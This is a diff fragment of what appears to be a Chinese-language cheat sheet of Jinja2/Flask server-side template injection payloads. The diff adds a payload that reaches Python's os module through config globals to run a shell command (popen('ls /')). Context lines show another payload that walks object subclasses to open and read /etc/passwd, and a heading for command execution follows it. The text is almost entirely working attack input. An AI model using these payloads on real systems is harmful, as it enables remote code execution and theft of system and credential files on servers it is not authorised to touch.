@@ -110,6 +110,10 @@ your input object基类的子类
 {% endfor %}
 
 
+
+{{ config.__class__.__init__.__globals__['os'].popen('ls /').read() }}
+
+
 #读取文件与写文件类
 {{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[%27open%27](%27/etc/passwd%27).read()}}
 #执行命令
